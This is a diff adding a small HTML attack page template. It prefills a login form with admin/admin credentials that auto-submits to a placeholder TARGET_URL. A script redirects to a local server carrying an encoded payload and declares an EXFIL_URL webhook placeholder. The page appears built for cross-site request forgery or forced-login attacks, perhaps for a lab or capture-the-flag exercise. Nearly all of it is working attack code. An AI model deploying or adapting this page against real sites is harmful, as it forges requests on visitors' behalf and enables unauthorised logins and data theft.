@@ -1,0 +1,17 @@
+<form action="TARGET_URL" method="GET">
+    <input type="text" name="username" value="admin" />
+    <input type="password" name="password" value="admin" />
+    <input type="submit" value="Login" />
+</form>
+<script>
+    const urlEncoded = `URL_ENCODED`;
+    const webhookURL = "EXFIL_URL";
+    const localServer = "LOCAL_SERVER";
+    const targetURL = "TARGET_URL";
+    if (window.location.href.endsWith(`${localServer}/`)) {
+        document.location = `${localServer}/index.html/${urlEncoded}`
+    } else {
+        const form = document.querySelector('form');
+        form.submit();
+    }
+</script>
